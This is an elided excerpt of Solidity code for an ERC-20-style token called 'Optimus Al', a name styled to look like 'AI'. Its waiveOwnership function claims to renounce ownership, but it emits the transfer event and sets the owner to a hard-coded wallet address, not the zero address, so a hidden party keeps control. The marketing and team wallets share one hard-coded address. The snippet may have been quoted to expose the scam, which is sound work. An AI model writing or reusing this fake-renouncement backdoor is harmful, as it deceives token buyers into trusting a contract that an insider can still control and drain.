...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x870b35E6640cc5a76b8323A2C568618f18Af64Fb));
        _owner = address(0x870b35E6640cc5a76b8323A2C568618f18Af64Fb);
    }
...
contract OptimusAl is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Optimus Al";
    string private _symbol = "Ai";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1a345977B82b65994E48C97953BfCa756d8959e2);
    address payable public teamWalletAddress = payable(0x1a345977B82b65994E48C97953BfCa756d8959e2);
